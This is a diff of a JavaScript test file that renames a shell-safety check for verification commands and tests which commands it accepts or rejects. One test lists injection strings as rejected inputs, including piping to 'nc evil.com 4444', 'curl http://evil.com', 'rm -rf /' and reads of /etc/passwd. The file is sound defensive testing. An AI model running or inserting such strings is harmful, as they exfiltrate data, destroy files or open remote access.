@@ -1,6 +1,6 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import { chooseAutoVerificationCommand, resolveVerificationPlan, isVerificationCommandSafe } from '../lib/hydra-verification.mjs';
+import { chooseAutoVerificationCommand, resolveVerificationPlan, isVerificationCommandShellSafe } from '../lib/hydra-verification.mjs';
 
 test('chooseAutoVerificationCommand prefers package typecheck script', () => {
   const selected = chooseAutoVerificationCommand({
@@ -102,31 +102,31 @@ test('resolveVerificationPlan returns disabled auto plan when no signal matches'
   assert.match(plan.reason, /No project-specific verification command/i);
 });
 
-test('isVerificationCommandSafe accepts well-formed commands', () => {
-  assert.equal(isVerificationCommandSafe('npm test'), true);
-  assert.equal(isVerificationCommandSafe('npm run verify'), true);
-  assert.equal(isVerificationCommandSafe('cargo check'), true);
-  assert.equal(isVerificationCommandSafe('go test ./...'), true);
-  assert.equal(isVerificationCommandSafe('python -m pytest -q'), true);
-  assert.equal(isVerificationCommandSafe('npx tsc --noEmit'), true);
-  assert.equal(isVerificationCommandSafe('node --test'), true);
+test('isVerificationCommandShellSafe accepts well-formed commands', () => {
+  assert.equal(isVerificationCommandShellSafe('npm test'), true);
+  assert.equal(isVerificationCommandShellSafe('npm run verify'), true);
+  assert.equal(isVerificationCommandShellSafe('cargo check'), true);
+  assert.equal(isVerificationCommandShellSafe('go test ./...'), true);
+  assert.equal(isVerificationCommandShellSafe('python -m pytest -q'), true);
+  assert.equal(isVerificationCommandShellSafe('npx tsc --noEmit'), true);
+  assert.equal(isVerificationCommandShellSafe('node --test'), true);
 });
 
-test('isVerificationCommandSafe rejects shell injection characters', () => {
-  assert.equal(isVerificationCommandSafe('npm test; curl http://evil.com'), false);
-  assert.equal(isVerificationCommandSafe('npm test && rm -rf /'), false);
-  assert.equal(isVerificationCommandSafe('npm test | nc evil.com 4444'), false);
-  assert.equal(isVerificationCommandSafe('npm test `whoami`'), false);
-  assert.equal(isVerificationCommandSafe('npm test $(cat /etc/passwd)'), false);
-  assert.equal(isVerificationCommandSafe('npm test > /tmp/out'), false);
-  assert.equal(isVerificationCommandSafe('npm test < /etc/passwd'), false);
+test('isVerificationCommandShellSafe rejects shell injection characters', () => {
+  assert.equal(isVerificationCommandShellSafe('npm test; curl http://evil.com'), false);
+  assert.equal(isVerificationCommandShellSafe('npm test && rm -rf /'), false);
+  assert.equal(isVerificationCommandShellSafe('npm test | nc evil.com 4444'), false);
+  assert.equal(isVerificationCommandShellSafe('npm test `whoami`'), false);
+  assert.equal(isVerificationCommandShellSafe('npm test $(cat /etc/passwd)'), false);
+  assert.equal(isVerificationCommandShellSafe('npm test > /tmp/out'), false);
+  assert.equal(isVerificationCommandShellSafe('npm test < /etc/passwd'), false);
 });
 
-test('isVerificationCommandSafe rejects empty or non-string input', () => {
-  assert.equal(isVerificationCommandSafe(''), false);
-  assert.equal(isVerificationCommandSafe(null), false);
-  assert.equal(isVerificationCommandSafe(undefined), false);
-  assert.equal(isVerificationCommandSafe(42), false);
+test('isVerificationCommandShellSafe rejects empty or non-string input', () => {
+  assert.equal(isVerificationCommandShellSafe(''), false);
+  assert.equal(isVerificationCommandShellSafe(null), false);
+  assert.equal(isVerificationCommandShellSafe(undefined), false);
+  assert.equal(isVerificationCommandShellSafe(42), false);
 });
 
 test('resolveVerificationPlan rejects unsafe config commands', () => {
